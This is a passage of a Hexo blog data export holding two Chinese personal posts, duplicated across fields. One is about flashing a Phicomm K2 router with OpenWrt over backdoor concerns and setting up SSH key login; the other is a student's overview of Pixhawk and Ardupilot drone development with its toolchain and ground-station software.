href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</a><br>  <a href=\"http://wiki.openwrt.org/zh-cn/doc/start\" target=\"_blank\" rel=\"external\">OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start</a></p>\n<hr>\n<h2 id=\"到货\"><a href=\"#到货\" class=\"headerlink\" title=\"到货\"></a>到货</h2><p>看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">后门</a>,吓得我赶紧连开机都不试了就开始找各种固件.</p>\n<h2 id=\"刷刷刷\"><a href=\"#刷刷刷\" class=\"headerlink\" title=\"刷刷刷\"></a>刷刷刷</h2><p>根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行”测试”…为了安全,我决定还是刷<strong>OpenWrt</strong>.当然也有同学刷其他固件的,也不错.从<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">这里</a>提供的云盘链接下载的K2配置文件发现不能恢复,后来从<a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\" target=\"_blank\" rel=\"external\">这里</a>下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误…后来还是果断选择了先解决breed,而后再刷OpenWrt固件,如果不信任上述百度云盘的文件,可以去<a href=\"https://downloads.openwrt.org/chaos_calmer/15.05.1/ramips/mt7620/\" target=\"_blank\" rel=\"external\">官网这里</a>(注意型号配对)去查md5和sha校验值,我已经查过了,没有问题,至于使用的过程中仍被强行注入广告应该是运营商的问题了.<br><img src=\"/images/OpenWrt.png\" alt=\"OpenWrt\"><br><img src=\"/images/Openwrt_sha256_compare.png\" alt=\"Openwrt_sha256_compare.png\"></p>\n<h2 id=\"测试玩玩\"><a href=\"#测试玩玩\" class=\"headerlink\" title=\"测试玩玩\"></a>测试玩玩</h2><p>关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)<code>ssh root@IP_Address</code>即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.<br><img src=\"/images/OpenWrt_ssh.png\" alt=\"OpenWrt_ssh\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和”数据采集”,作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.</p>\n","excerpt":"","more":"<blockquote>\n<p>自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.</p>\n</blockquote>\n<p>  参考资料:<br>  <a href=\"http://bbs.newifi.com/thread-3351-1-1.html\">http://bbs.newifi.com/thread-3351-1-1.html</a><br>  <a href=\"http://www.shaoit.com/feixunshuaji.html\">http://www.shaoit.com/feixunshuaji.html</a><br>  <a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\">http://www.qqgzs.com/archives/k2-v22-148.html</a><br>  <a href=\"http://www.openwrt.org.cn/bbs/thread-60-1-1.html\">http://www.openwrt.org.cn/bbs/thread-60-1-1.html</a><br>  <a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\">http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</a><br>  <a href=\"http://wiki.openwrt.org/zh-cn/doc/start\">OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start</a></p>\n<hr>\n<h2 id=\"到货\"><a href=\"#到货\" class=\"headerlink\" title=\"到货\"></a>到货</h2><p>看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\">后门</a>,吓得我赶紧连开机都不试了就开始找各种固件.</p>\n<h2 id=\"刷刷刷\"><a href=\"#刷刷刷\" class=\"headerlink\" title=\"刷刷刷\"></a>刷刷刷</h2><p>根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行”测试”…为了安全,我决定还是刷<strong>OpenWrt</strong>.当然也有同学刷其他固件的,也不错.从<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\">这里</a>提供的云盘链接下载的K2配置文件发现不能恢复,后来从<a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\">这里</a>下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误…后来还是果断选择了先解决breed,而后再刷OpenWrt固件,如果不信任上述百度云盘的文件,可以去<a href=\"https://downloads.openwrt.org/chaos_calmer/15.05.1/ramips/mt7620/\">官网这里</a>(注意型号配对)去查md5和sha校验值,我已经查过了,没有问题,至于使用的过程中仍被强行注入广告应该是运营商的问题了.<br><img src=\"/images/OpenWrt.png\" alt=\"OpenWrt\"><br><img src=\"/images/Openwrt_sha256_compare.png\" alt=\"Openwrt_sha256_compare.png\"></p>\n<h2 id=\"测试玩玩\"><a href=\"#测试玩玩\" class=\"headerlink\" title=\"测试玩玩\"></a>测试玩玩</h2><p>关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)<code>ssh root@IP_Address</code>即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.<br><img src=\"/images/OpenWrt_ssh.png\" alt=\"OpenWrt_ssh\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和”数据采集”,作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.</p>\n"},{"title":"无人机学习概况","date":"2016-08-25T05:53:11.000Z","_content":"\n# Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\n\n参考资料:  \n[老吴学长教程:http://www.nephen.com/arrange/archive.html](http://www.nephen.com/arrange/archive.html \"老吴\")\n[Ardupilot:http://ardupilot.org/copter/index.html](http://ardupilot.org/copter/index.html)\n[Pixhawk开发者:http://dev.px4.io/](http://dev.px4.io/)\n\n---\n\n# Pixhawk\n首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是\"悟\"系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王--Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱...其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.\n![梦创的板子](/images/pixhawk.jpg)\n\n# Ardupilot\n这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序**ArduCopter**，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制...可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入`make px4-v2`即可．键入`make px4-v2-upload`即可上载代码．我的开发平台是ubuntu 16.04 amd64.\n![targets](/images/targets.png)\n\n# 交叉编译工具链\n熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了...具体到开发Pixhawk所用到的编译器就是`arm-none-eabi-gcc`家族,详情安装方式参考官网[APM](http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html)或者[PX4](http://dev.px4.io/starting-installing-linux.html)都可以，也可以看我[学长的教程](http://www.nephen.com/2016/01/introduction-to-start-ArduPilot),只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决...最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.\n![arm-none-eabi-gcc](/images/arm-none-eabi-gcc.png)\n\n# 上位机\n一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．\n![APMPlanner](/images/APMPlanner.png)\n\n---\n\n# 总结\n去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．\n","source":"_posts/无人机学习概况.md","raw":"---\ntitle: 无人机学习概况\ndate: 2016-08-25 13:53:11\ncategories: \n- study\n- misc\ntags: \n- C/C++\n- emb\n- uav\n- pixhawk\n---\n\n# Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\n\n参考资料:  \n[老吴学长教程:http://www.nephen.com/arrange/archive.html](http://www.nephen.com/arrange/archive.html \"老吴\")\n[Ardupilot:http://ardupilot.org/copter/index.html](http://ardupilot.org/copter/index.html)\n[Pixhawk开发者:http://dev.px4.io/](http://dev.px4.io/)\n\n---\n\n# Pixhawk\n首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是\"悟\"系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王--Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱...其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.\n![梦创的板子](/images/pixhawk.jpg)\n\n# Ardupilot\n这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序**ArduCopter**，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制...可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入`make px4-v2`即可．键入`make px4-v2-upload`即可上载代码．我的开发平台是ubuntu 16.04 amd64.\n![targets](/images/targets.png)\n\n# 交叉编译工具链\n熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了...具体到开发Pixhawk所用到的编译器就是`arm-none-eabi-gcc`家族,详情安装方式参考官网[APM](http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html)或者[PX4](http://dev.px4.io/starting-installing-linux.html)都可以，也可以看我[学长的教程](http://www.nephen.com/2016/01/introduction-to-start-ArduPilot),只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决...最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.\n![arm-none-eabi-gcc](/images/arm-none-eabi-gcc.png)\n\n# 上位机\n一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．\n![APMPlanner](/images/APMPlanner.png)\n\n---\n\n# 总结\n去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．\n","slug":"无人机学习概况","published":1,"updated":"2016-11-14T02:56:11.118Z","_id":"civhncdh7001sg8uamx290t60","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\"><a href=\"#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\" class=\"headerlink\" title=\"Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\"></a>Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)</h1><p>参考资料:<br><a href=\"http://www.nephen.com/arrange/archive.html\" title=\"老吴\" target=\"_blank\" rel=\"external\">老吴学长教程:http://www.nephen.com/arrange/archive.html</a><br><a href=\"http://ardupilot.org/copter/index.html\" target=\"_blank\" rel=\"external\">Ardupilot:http://ardupilot.org/copter/index.html</a><br><a href=\"http://dev.px4.io/\" target=\"_blank\" rel=\"external\">Pixhawk开发者:http://dev.px4.io/</a></p>\n<hr>\n<h1 id=\"Pixhawk\"><a href=\"#Pixhawk\" class=\"headerlink\" title=\"Pixhawk\"></a>Pixhawk</h1><p>首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是”悟”系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王–Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱…其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.<br><img src=\"/images/pixhawk.jpg\" alt=\"梦创的板子\"></p>\n<h1 id=\"Ardupilot\"><a href=\"#Ardupilot\" class=\"headerlink\" title=\"Ardupilot\"></a>Ardupilot</h1><p>这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序<strong>ArduCopter</strong>，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制…可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入<code>make px4-v2</code>即可．键入<code>make px4-v2-upload</code>即可上载代码．我的开发平台是ubuntu 16.04 amd64.<br><img src=\"/images/targets.png\" alt=\"targets\"></p>\n<h1 id=\"交叉编译工具链\"><a href=\"#交叉编译工具链\" class=\"headerlink\" title=\"交叉编译工具链\"></a>交叉编译工具链</h1><p>熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了…具体到开发Pixhawk所用到的编译器就是<code>arm-none-eabi-gcc</code>家族,详情安装方式参考官网<a href=\"http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html\" target=\"_blank\" rel=\"external\">APM</a>或者<a href=\"http://dev.px4.io/starting-installing-linux.html\" target=\"_blank\" rel=\"external\">PX4</a>都可以，也可以看我<a href=\"http://www.nephen.com/2016/01/introduction-to-start-ArduPilot\" target=\"_blank\" rel=\"external\">学长的教程</a>,只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决…最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.<br><img src=\"/images/arm-none-eabi-gcc.png\" alt=\"arm-none-eabi-gcc\"></p>\n<h1 id=\"上位机\"><a href=\"#上位机\" class=\"headerlink\" title=\"上位机\"></a>上位机</h1><p>一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．<br><img src=\"/images/APMPlanner.png\" alt=\"APMPlanner\"></p>\n<hr>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．</p>\n","excerpt":"","more":"<h1 id=\"Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\"><a href=\"#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\" class=\"headerlink\" title=\"Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\"></a>Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)</h1><p>参考资料:<br><a href=\"http://www.nephen.com/arrange/archive.html\" title=\"老吴\">老吴学长教程:http://www.nephen.com/arrange/archive.html</a><br><a href=\"http://ardupilot.org/copter/index.html\">Ardupilot:http://ardupilot.org/copter/index.html</a><br><a href=\"http://dev.px4.io/\">Pixhawk开发者:http://dev.px4.io/</a></p>\n<hr>\n<h1 id=\"Pixhawk\"><a href=\"#Pixhawk\" class=\"headerlink\" title=\"Pixhawk\"></a>Pixhawk</h1><p>首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是”悟”系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王–Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱…其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.<br><img src=\"/images/pixhawk.jpg\" alt=\"梦创的板子\"></p>\n<h1 